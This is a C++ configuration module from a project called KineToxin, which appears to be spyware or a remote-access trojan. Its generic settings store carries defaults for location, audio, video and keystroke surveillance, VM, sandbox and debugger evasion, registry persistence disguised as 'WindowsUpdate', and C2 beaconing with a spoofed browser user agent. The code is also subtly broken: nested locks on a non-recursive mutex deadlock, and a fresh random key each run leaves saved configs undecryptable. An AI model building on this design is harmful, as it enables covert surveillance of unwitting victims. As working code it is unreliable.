#include "config.h"
#include "crypto.h"
#include <fstream>
#include <sstream>
#include <algorithm>
#include <filesystem>

namespace KineToxin {
namespace Utils {

// Static member initialization
BOOL Config::bInitialized = FALSE;
BOOL Config::bEncrypted = TRUE;
std::string Config::configFilePath;
std::map<std::string, ConfigValue> Config::configValues;
std::mutex Config::configMutex;
std::vector<BYTE> Config::encryptionKey;

BOOL Config::Initialize(const std::string& configFile, BOOL encrypted) {
    std::lock_guard<std::mutex> lock(configMutex);
    
    if (bInitialized) {
        return TRUE;
    }
    
    configFilePath = configFile;
    bEncrypted = encrypted;
    
    // Create config directory if it doesn't exist
    std::filesystem::path configPath(configFile);
    std::filesystem::path configDir = configPath.parent_path();
    
    if (!configDir.empty() && !std::filesystem::exists(configDir)) {
        std::filesystem::create_directories(configDir);
    }
    
    // Initialize crypto if encryption is enabled
    if (bEncrypted) {
        if (!Crypto::Initialize()) {
            return FALSE;
        }
        
        // Generate or load encryption key
        if (!Crypto::GenerateRandomBytes(32, encryptionKey)) {
            Crypto::Cleanup();
            return FALSE;
        }
    }
    
    bInitialized = TRUE;
    
    // Set default configuration values
    SetDefaults();
    
    // Try to load existing configuration
    LoadConfig();
    
    return TRUE;
}

void Config::Cleanup() {
    std::lock_guard<std::mutex> lock(configMutex);
    
    if (!bInitialized) {
        return;
    }
    
    // Save current configuration
    SaveConfig();
    
    configValues.clear();
    encryptionKey.clear();
    
    if (bEncrypted) {
        Crypto::Cleanup();
    }
    
    bInitialized = FALSE;
}

BOOL Config::LoadConfig() {
    if (!bInitialized) {
        return FALSE;
    }
    
    std::ifstream file;
    
    if (bEncrypted) {
        file.open(configFilePath, std::ios::binary);
    } else {
        file.open(configFilePath);
    }
    
    if (!file.is_open()) {
        // File doesn't exist, use defaults
        return TRUE;
    }
    
    std::string content;
    
    if (bEncrypted) {
        // Read encrypted data
        DWORD dataLength;
        file.read(reinterpret_cast<char*>(&dataLength), sizeof(dataLength));
        
        if (file.good() && dataLength > 0 && dataLength < 1000000) { // Sanity check
            std::vector<BYTE> encryptedData(dataLength);
            file.read(reinterpret_cast<char*>(encryptedData.data()), dataLength);
            
            if (file.good()) {
                if (!DecryptConfigData(encryptedData, content)) {
                    file.close();
                    return FALSE;
                }
            }
        }
    } else {
        // Read plain text
        std::ostringstream buffer;
        buffer << file.rdbuf();
        content = buffer.str();
    }
    
    file.close();
    
    return ParseConfigContent(content);
}

BOOL Config::SaveConfig() {
    if (!bInitialized) {
        return FALSE;
    }
    
    std::lock_guard<std::mutex> lock(configMutex);
    
    std::string content = GenerateConfigContent();
    
    std::ofstream file;
    
    if (bEncrypted) {
        file.open(configFilePath, std::ios::binary);
        
        if (!file.is_open()) {
            return FALSE;
        }
        
        std::vector<BYTE> encryptedData;
        if (!EncryptConfigData(content, encryptedData)) {
            file.close();
            return FALSE;
        }
        
        DWORD dataLength = static_cast<DWORD>(encryptedData.size());
        file.write(reinterpret_cast<const char*>(&dataLength), sizeof(dataLength));
        file.write(reinterpret_cast<const char*>(encryptedData.data()), encryptedData.size());
    } else {
        file.open(configFilePath);
        
        if (!file.is_open()) {
            return FALSE;
        }
        
        file << content;
    }
    
    file.close();
    return TRUE;
}

void Config::SetString(const std::string& section, const std::string& key, 
                      const std::string& value) {
    if (!bInitialized) return;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    configValues[sectionKey] = ConfigValue(value);
}

std::string Config::GetString(const std::string& section, const std::string& key, 
                             const std::string& defaultValue) {
    if (!bInitialized) return defaultValue;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    auto it = configValues.find(sectionKey);
    if (it != configValues.end() && it->second.type == ConfigValueType::STRING) {
        return it->second.stringValue;
    }
    
    return defaultValue;
}

void Config::SetInt(const std::string& section, const std::string& key, int value) {
    if (!bInitialized) return;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    configValues[sectionKey] = ConfigValue(value);
}

int Config::GetInt(const std::string& section, const std::string& key, int defaultValue) {
    if (!bInitialized) return defaultValue;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    auto it = configValues.find(sectionKey);
    if (it != configValues.end() && it->second.type == ConfigValueType::INTEGER) {
        return it->second.intValue;
    }
    
    return defaultValue;
}

void Config::SetBool(const std::string& section, const std::string& key, bool value) {
    if (!bInitialized) return;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    configValues[sectionKey] = ConfigValue(value);
}

bool Config::GetBool(const std::string& section, const std::string& key, bool defaultValue) {
    if (!bInitialized) return defaultValue;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    auto it = configValues.find(sectionKey);
    if (it != configValues.end() && it->second.type == ConfigValueType::BOOLEAN) {
        return it->second.boolValue;
    }
    
    return defaultValue;
}

void Config::SetFloat(const std::string& section, const std::string& key, double value) {
    if (!bInitialized) return;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    configValues[sectionKey] = ConfigValue(value);
}

double Config::GetFloat(const std::string& section, const std::string& key, 
                       double defaultValue) {
    if (!bInitialized) return defaultValue;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    auto it = configValues.find(sectionKey);
    if (it != configValues.end() && it->second.type == ConfigValueType::FLOAT) {
        return it->second.floatValue;
    }
    
    return defaultValue;
}

BOOL Config::HasKey(const std::string& section, const std::string& key) {
    if (!bInitialized) return FALSE;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    return configValues.find(sectionKey) != configValues.end();
}

BOOL Config::RemoveKey(const std::string& section, const std::string& key) {
    if (!bInitialized) return FALSE;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionKey = CreateSectionKey(section, key);
    
    auto it = configValues.find(sectionKey);
    if (it != configValues.end()) {
        configValues.erase(it);
        return TRUE;
    }
    
    return FALSE;
}

std::vector<std::string> Config::GetSectionKeys(const std::string& section) {
    std::vector<std::string> keys;
    
    if (!bInitialized) return keys;
    
    std::lock_guard<std::mutex> lock(configMutex);
    std::string sectionPrefix = section + ".";
    
    for (const auto& pair : configValues) {
        if (pair.first.substr(0, sectionPrefix.length()) == sectionPrefix) {
            keys.push_back(pair.first.substr(sectionPrefix.length()));
        }
    }
    
    return keys;
}

std::vector<std::string> Config::GetSections() {
    std::vector<std::string> sections;
    
    if (!bInitialized) return sections;
    
    std::lock_guard<std::mutex> lock(configMutex);
    
    for (const auto& pair : configValues) {
        size_t dotPos = pair.first.find('.');
        if (dotPos != std::string::npos) {
            std::string section = pair.first.substr(0, dotPos);
            if (std::find(sections.begin(), sections.end(), section) == sections.end()) {
                sections.push_back(section);
            }
        }
    }
    
    return sections;
}

void Config::SetDefaults() {
    // Logging configuration
    SetString("logging", "level", "info");
    SetString("logging", "file", "logs/kinetoxin.log");
    SetBool("logging", "encrypt", true);
    SetBool("logging", "console", false);
    SetInt("logging", "max_size", 10485760); // 10MB
    
    // Surveillance configuration
    SetBool("surveillance", "location_enabled", true);
    SetInt("surveillance", "location_interval", 300000); // 5 minutes
    SetBool("surveillance", "audio_enabled", false);
    SetBool("surveillance", "video_enabled", false);
    SetBool("surveillance", "keylog_enabled", false);
    
    // Evasion configuration
    SetBool("evasion", "vm_detection", true);
    SetBool("evasion", "sandbox_detection", true);
    SetBool("evasion", "debug_detection", true);
    SetInt("evasion", "check_interval", 60000); // 1 minute
    
    // Persistence configuration
    SetBool("persistence", "enabled", false);
    SetString("persistence", "method", "registry");
    SetString("persistence", "key_name", "WindowsUpdate");
    
    // C2 configuration
    SetString("c2", "server", "");
    SetInt("c2", "port", 443);
    SetBool("c2", "ssl", true);
    SetInt("c2", "beacon_interval", 3600000); // 1 hour
    SetString("c2", "user_agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36");
    
    // Crypto configuration
    SetString("crypto", "algorithm", "AES256");
    SetBool("crypto", "compress", true);
}

std::string Config::CreateSectionKey(const std::string& section, const std::string& key) {
    return section + "." + key;
}

BOOL Config::ParseConfigContent(const std::string& content) {
    std::istringstream stream(content);
    std::string line;
    std::string currentSection;
    
    while (std::getline(stream, line)) {
        line = Trim(line);
        
        // Skip empty lines and comments
        if (line.empty() || line[0] == '#' || line[0] == ';') {
            continue;
        }
        
        // Check for section header [section]
        if (line[0] == '[' && line.back() == ']') {
            currentSection = line.substr(1, line.length() - 2);
            continue;
        }
        
        // Parse key=value pairs
        size_t equalPos = line.find('=');
        if (equalPos != std::string::npos) {
            std::string key = Trim(line.substr(0, equalPos));
            std::string value = Trim(line.substr(equalPos + 1));
            
            if (!currentSection.empty() && !key.empty()) {
                // Try to determine value type
                if (value == "true" || value == "false") {
                    SetBool(currentSection, key, value == "true");
                } else if (value.find('.') != std::string::npos) {
                    try {
                        double floatVal = std::stod(value);
                        SetFloat(currentSection, key, floatVal);
                    } catch (...) {
                        SetString(currentSection, key, value);
                    }
                } else {
                    try {
                        int intVal = std::stoi(value);
                        SetInt(currentSection, key, intVal);
                    } catch (...) {
                        SetString(currentSection, key, value);
                    }
                }
            }
        }
    }
    
    return TRUE;
}

std::string Config::GenerateConfigContent() {
    std::ostringstream content;
    
    content << "# KineToxin Configuration File\n";
    content << "# Generated automatically - modify with caution\n\n";
    
    std::vector<std::string> sections = GetSections();
    
    for (const std::string& section : sections) {
        content << "[" << section << "]\n";
        
        std::vector<std::string> keys = GetSectionKeys(section);
        for (const std::string& key : keys) {
            std::string sectionKey = CreateSectionKey(section, key);
            auto it = configValues.find(sectionKey);
            
            if (it != configValues.end()) {
                content << key << "=";
                
                switch (it->second.type) {
                    case ConfigValueType::STRING:
                        content << it->second.stringValue;
                        break;
                    case ConfigValueType::INTEGER:
                        content << it->second.intValue;
                        break;
                    case ConfigValueType::BOOLEAN:
                        content << (it->second.boolValue ? "true" : "false");
                        break;
                    case ConfigValueType::FLOAT:
                        content << it->second.floatValue;
                        break;
                }
                
                content << "\n";
            }
        }
        
        content << "\n";
    }
    
    return content.str();
}

BOOL Config::EncryptConfigData(const std::string& data, std::vector<BYTE>& encrypted) {
    if (!bEncrypted || encryptionKey.empty()) {
        return FALSE;
    }
    
    std::vector<BYTE> dataBytes(data.begin(), data.end());
    return Crypto::EncryptAES256(dataBytes, encryptionKey, encrypted);
}

BOOL Config::DecryptConfigData(const std::vector<BYTE>& encrypted, std::string& data) {
    if (!bEncrypted || encryptionKey.empty()) {
        return FALSE;
    }
    
    std::vector<BYTE> decryptedBytes;
    if (!Crypto::DecryptAES256(encrypted, encryptionKey, decryptedBytes)) {
        return FALSE;
    }
    
    data = std::string(decryptedBytes.begin(), decryptedBytes.end());
    return TRUE;
}

std::string Config::Trim(const std::string& str) {
    size_t start = str.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    
    size_t end = str.find_last_not_of(" \t\r\n");
    return str.substr(start, end - start + 1);
}

} // namespace Utils
} // namespace KineToxin
